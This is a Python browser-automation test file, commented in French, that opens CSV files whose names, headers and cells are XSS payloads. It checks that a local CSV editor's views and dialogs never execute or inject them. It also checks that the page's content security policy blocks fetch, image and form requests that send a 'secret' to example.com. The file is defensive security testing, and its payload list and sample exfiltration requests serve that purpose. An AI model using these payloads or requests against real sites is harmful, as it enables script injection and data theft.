"""Un CSV hostile ne doit jamais exécuter de code dans la page.

Pourquoi c'est critique : la page détient le jeton du serveur, qui lit et
écrit n'importe quel fichier de l'utilisateur. Une valeur de cellule, un titre
de colonne ou un nom de fichier qui finirait en HTML actif ferait d'un CSV
piégé un accès au disque. Ce test ouvre des fichiers dont le nom, les titres
et les valeurs sont des charges XSS, parcourt toutes les vues et boîtes de
dialogue qui affichent ces données, et vérifie après chaque étape :
- qu'aucune charge ne s'est exécutée (window.__xssHits reste vide) ;
- qu'aucun élément ni attribut injecté n'existe dans le DOM, même inerte
  (un <img src=x>, un attribut on… venu des données).
Une seule exécution doit bloquer une version.
"""

import csv
import io
import json
import os
import unittest

from tests.cdp import Chrome, find_chromium
from tests.support import Bridge
from tests.test_forensic import HELPER


def payloads(k):
    """Charges marquées k : chacune appelle __xss(k) si elle s'exécute."""
    call = f"__xss('{k}')"
    return [
        f"<img src=x onerror={call}>",
        f"\"><img src=x onerror={call}>",
        f"'><img src=x onerror={call}>",
        f"');{call};('",
        f"\" onmouseover=\"{call}\" x=\"",
        f"' onmouseover='{call}' x='",
        f"<svg onload={call}>",
        f"</script><script>{call}</script>",
        f"${{{call}}}",
        f"javascript:{call}",
        f"&lt;img src=x onerror={call}&gt;",
        f"{{{call}}}",
    ]


def hostile_csv(tag):
    # Les mêmes titres dans les deux fichiers : la comparaison a des colonnes en commun à afficher.
    heads = [f"H{i}{p}" for i, p in enumerate(payloads("head")[:6])]
    out = io.StringIO()
    w = csv.writer(out, delimiter=";", lineterminator="\n")
    w.writerow(heads)
    cells = payloads(f"{tag}-cell")
    for r in range(8):
        w.writerow([cells[(r + c) % len(cells)] if c < 4 else str(r * 7 + c) for c in range(6)])
    w.writerow(["1;2;3", "<b>", "&amp;", "‮<img src=x onerror=__xss('bidi')>", "x\x00<script>", "9"])
    return out.getvalue().encode("utf-8")


FILE_NAME = "x<img src=x onerror=__xss('fname')>'\"&.csv"

PROBE = r"""
window.__xssHits = [];
window.__csp = [];                       // la CSP de la page ne doit rien bloquer de l'app elle-même
document.addEventListener('securitypolicyviolation', e => window.__csp.push(`${e.violatedDirective} ${e.blockedURI}`));
window.__xss = k => { window.__xssHits.push(String(k)); };
window.__injected = () => {
  const bad = [];
  for (const el of document.querySelectorAll('*')) {
    /* A handler that passes a value along as a string argument (fxInsert("{…}")) carries the
       payload as data: string literals are removed first, and only a call left outside them counts. */
    for (const a of el.attributes) if (/^on/i.test(a.name) && a.value.includes('__xss')) {
      const code = a.value.replace(/"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'|`(?:[^`\\]|\\.)*`/g, '""');
      if (code.includes('__xss')) bad.push(`${el.tagName.toLowerCase()}[${a.name}] ${a.value.slice(0, 120)}`);
    }
    if (el.tagName === 'IMG' && el.getAttribute('src') === 'x') bad.push('img[src=x]');
    if (el.tagName === 'SCRIPT' && el.textContent.includes('__xss')) bad.push('script');
    if (el.tagName === 'svg' && el.hasAttribute('onload')) bad.push('svg[onload]');
    if (el.tagName === 'A' && /^\s*javascript:/i.test(el.getAttribute('href') || '')) bad.push('a[href=javascript:]');
  }
  return bad;
};
true
"""

# Les vues et boîtes de dialogue qui affichent des titres, des valeurs ou des noms de fichiers.
STEPS = r"""
(async (p1, p2) => {
  const report = [], errors = [];
  const pause = (ms = 60) => new Promise(r => setTimeout(r, ms));
  const check = name => { const bad = window.__injected(); if (bad.length || window.__xssHits.length) report.push({ step: name, injected: [...new Set(bad)], hits: [...window.__xssHits] }); window.__xssHits = [];
window.__csp = [];                       // la CSP de la page ne doit rien bloquer de l'app elle-même
document.addEventListener('securitypolicyviolation', e => window.__csp.push(`${e.violatedDirective} ${e.blockedURI}`)); };
  const step = async (name, fn) => { try { await fn(); await pause(); } catch (e) { errors.push(name + ': ' + (e && e.message || e)); } check(name); };
  const ev = { stopPropagation() {}, preventDefault() {}, target: document.body, currentTarget: document.body, clientX: 200, clientY: 200 };
  const input = (id, v) => { const el = document.getElementById(id); el.value = v; el.dispatchEvent(new Event('input', { bubbles: true })); };
  const hover = () => { for (const el of [...document.querySelectorAll('[title], [data-t]')].slice(0, 400)) el.dispatchEvent(new MouseEvent('mouseover', { bubbles: true })); };

  let tab;
  await step('open', async () => { tab = await __fx.open(p1); });
  const t = __fx.tab(tab), W = t.headers.length;
  await step('grid + header + tabs + status', async () => { render(); renderTabBar(); renderStatusFormat(); });
  await step('sort (strip labels)', async () => { sortBy(0); await pause(150); sortBy(1); await pause(150); });
  await step('row card, raw, why', async () => { setSel(t, 0, 0, 0, 0); toggleRowCard(true); rowCardRaw(true); rowCardDiag(true); rowCardSync(true); rowCardMove(1); rowCardMove(1); });
  await step('row card search', async () => { rowCard.q = 'img'; rowCardFields(); rowCard.q = ''; });
  for (let c = 0; c < W; c++) await step('column panel ' + c, async () => { openColPanelFor(c); await pause(80); closeColPanel(); });
  await step('profile', async () => { await openProfile(); await pause(300); closeAllModals(); });
  await step('file map', async () => { openFileMap(); while (!fmap.done) await pause(20);
    const cv = document.getElementById('mp-cv').getBoundingClientRect();
    document.getElementById('mp-cv').dispatchEvent(new MouseEvent('mousemove', { clientX: cv.left + 20, clientY: cv.top + 5, bubbles: true })); hover(); closeAllModals(); });
  await step('column charts', async () => { for (let k = 0; k < 200 && (spkJob || !t.spk); k++) await pause(20);
    for (const box of document.querySelectorAll('.spk')) { const r = box.getBoundingClientRect();
      box.dispatchEvent(new MouseEvent('mousemove', { clientX: r.left + 3, clientY: r.top + 6, bubbles: true })); }
    const c = t.spk.cols.findIndex(x => x.k === 't' && x.segs.length);
    if (c >= 0) { spkFilter(t, c, { seg: 0 }); await pause(300); spkFilter(t, c, { seg: 0 }); await pause(100); } });
  await step('what I noticed', async () => { openInsights(); for (let k = 0; k < 300 && !(insights && insights.done); k++) await pause(20); hover();
    const it = insights.items.find(x => x.show); if (it) { await inShow(it.id); await pause(); render(); hover(); clearRowMark(); } closeAllModals(); });
  await step('fill by example', async () => { const c = 2;
    setCells(t, t.allData.slice(1).map(r => [r, c, '']), 'cleared');
    setCells(t, [[t.allData[0], c, cellStr(cellOf(t.allData[0], 0))]], 'set');
    setSel(t, 0, c, 0, c); fillByExample(); await pause(200);
    if (!ffx) throw new Error('no rule offered'); render(); hover(); ffAccept(); await pause(100); });
  await step('right-click menus', async () => {
    const at = el => { const b = el.getBoundingClientRect(); el.dispatchEvent(new MouseEvent('contextmenu', { clientX: b.left + 5, clientY: b.top + 5, bubbles: true, cancelable: true })); };
    for (const c of [0, 1, 2, 3]) { const td = tbody.querySelector(`.row[data-idx="0"] .cell[data-c="${c}"]`); if (td) { at(td); await pause(); hover(); closeDDs(); } }
    at(tbody.querySelector('.row[data-idx="1"] .col-idx')); await pause(); closeDDs();
    sortBy(1); await pause(600); container.scrollTop = 3 * ROW_H; renderOnScroll(); await pause(); });
  await step('palette', async () => { openPalette(); input('cmdk-in', 'H'); await pause(); input('cmdk-in', 'img'); await pause(); closePalette(); });
  await step('find bar', async () => { toggleSRBar(); input('sr-find', 'img'); await pause(200); findStep(1); toggleSRBar(); });
  await step('global filter + marks', async () => { input('global-search', 'img'); await pause(500); input('global-search', ''); await pause(300); });
  await step('expression autocomplete', async () => { const g = document.getElementById('global-search'); g.focus(); g.value = '{'; g.setSelectionRange(1, 1); exprAcUpdate(); await pause(); g.value = ''; exprAcUpdate(); });
  await step('fx picker', async () => { openFxPicker(document.getElementById('global-search')); await pause(150); closeFxPicker(false); });
  for (const [name, fn] of [['formula', () => openFormula()], ['split', () => openSplit(0)], ['merge', () => openMerge(0)], ['convert', () => openConvert(0)],
                            ['bulk', () => openBulk()], ['clean', () => openClean()], ['anonymise', () => openAnon()], ['dedupe', () => openDedupe()],
                            ['group by', () => { openGroupBy(); gbToggleCol(0, true); gbToggleCol(1, true); }], ['columns manager', () => openColManager()],
                            ['save dialog', () => openSaveModal()], ['shortcuts', () => openKeys()], ['lookup', () => openLookup(0)],
                            ['noise words', () => { openNoise(); input('nz-words', 'img, src, x'); noiseRefresh(); }],
                            ['schema create', () => openSchemaCreate()],
                            ['split into files', async () => { openSplitFiles(1); await pause(200); }],
                            ['pivot table', async () => { openPivot(0); document.getElementById('pt-c').value = 1; pivotChange(); await pause(200); pivotSort(0); pivotDrill(0, 0); await pause(); render(); clearRowMark(); }],
                            ['schema report', async () => { await openSchemaValidate(); const s = await schemaInfer(t);
                                s.fields.forEach(f => f.constraints = { enum: ["<img src=x onerror=__xss('enum')>"], pattern: "<b>x</b>" });
                                await schemaRun(t, "<img src=x onerror=__xss('schema-name')>.json", JSON.stringify(s)); schemaShow(0); }]])
    await step(name, async () => { await fn(); await pause(250); closeAllModals(); });
  for (const k of ['d', 'e', 'h']) await step('status menu ' + k, async () => { openSbMenu({ ...ev, currentTarget: document.querySelector('.sb-pill') }, k); closeDDs(); });
  await step('row menu', async () => { openRowMenu({ ...ev, target: document.querySelector('.row-btn') || document.body }, t.allData[0].id); closeDDs(); });
  await step('edit + toast + review', async () => { setCells(t, [[t.allData[0], 1, "<img src=x onerror=__xss('edit')>"]], 'set'); await pause(100); await openReview(); await pause(400); closeAllModals(); });
  await step('second file, compare', async () => { await __fx.open(p2); activateTab(tab); await pause(); openCompare(); await pause(600);
    if (!document.querySelector('#modal-compare tr td')) throw new Error('no compare result shown'); compareMark(); await pause(); render(); closeAllModals(); });
  await step('combine files', async () => { openCombine(); document.getElementById('cb-source').checked = true; await combineRefresh(); await pause(300);
    if (!document.querySelector('#cb-pv tr td')) throw new Error('no combine preview shown'); closeAllModals(); combine = null; });
  await step('sheet picker', async () => {
    const names = ["<img src=x onerror=__xss('sheet')>", "\"><svg onload=__xss('sheet')>"];
    const p = pickSheet("<img src=x onerror=__xss('book')>.xlsx", names.map(n => ({ name: n, filled: true, hidden: false, dim: [3, 2] })));
    await pause(); check('sheet picker (open)');
    document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); await p; });
  await step('tooltips', async () => { hover(); });
  await step('welcome screen (recents)', async () => { renderWelcome(); await pause(400); });
  return { report, errors, csp: [...new Set(window.__csp)] };
})
"""


@unittest.skipUnless(find_chromium(), "Chromium introuvable")
class XssTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.b = Bridge().start()
        cls.p1 = cls.b.tmp(FILE_NAME)
        cls.p2 = cls.b.tmp("second " + FILE_NAME)
        for p, tag in ((cls.p1, "a"), (cls.p2, "b")):
            with open(p, "wb") as f:
                f.write(hostile_csv(tag))
        cls.chrome = Chrome(cls.b.origin + "/")
        try:
            cls.chrome.wait_for("typeof addPathTabs === 'function' && document.readyState === 'complete'")
            cls.chrome.eval(HELPER)
            cls.chrome.eval(PROBE)
        except Exception:
            cls.chrome.close()
            cls.b.stop()
            raise

    @classmethod
    def tearDownClass(cls):
        cls.chrome.close()
        cls.b.stop()

    def test_hostile_values_never_become_html(self):
        res = self.chrome.eval(f"({STEPS})({json.dumps(self.p1)}, {json.dumps(self.p2)})", timeout=180)
        self.assertEqual(res["report"], [], "du HTML actif venu des données :\n" + json.dumps(res["report"], indent=1, ensure_ascii=False))
        # Les étapes doivent avoir réellement tourné : une boîte qui lève ne prouve rien.
        self.assertEqual(res["errors"], [], "étapes qui ont échoué (rien n'a donc été vérifié pour elles) :\n" + "\n".join(res["errors"]))
        self.assertEqual(res["csp"], [], "la politique de sécurité bloque une partie de l'app")

    def test_page_cannot_send_data_elsewhere(self):
        # Quoi qu'exécute la page, la CSP l'empêche d'envoyer à un autre serveur que le sien.
        res = self.chrome.eval(r"""(async () => {
          const blocked = [];
          const seen = new Promise(r => document.addEventListener('securitypolicyviolation', e => { blocked.push(e.violatedDirective); if (blocked.length >= 3) r(); }));
          try { await fetch('https://example.com/?k=secret'); blocked.push('fetch passed'); } catch (e) { }
          new Image().src = 'https://example.com/pixel?k=secret';
          const f = document.createElement('form'); f.action = 'https://example.com/'; f.method = 'post'; document.body.append(f);
          try { f.submit(); } catch (e) { }
          await Promise.race([seen, new Promise(r => setTimeout(r, 2000))]);
          f.remove();
          return { blocked, own: (await fetch('/api/ping')).ok };
        })()""")
        self.assertNotIn("fetch passed", res["blocked"])
        self.assertTrue({"connect-src", "img-src", "form-action"} <= set(res["blocked"]), res)
        self.assertTrue(res["own"])                  # le serveur local reste joignable


if __name__ == "__main__":
    unittest.main()
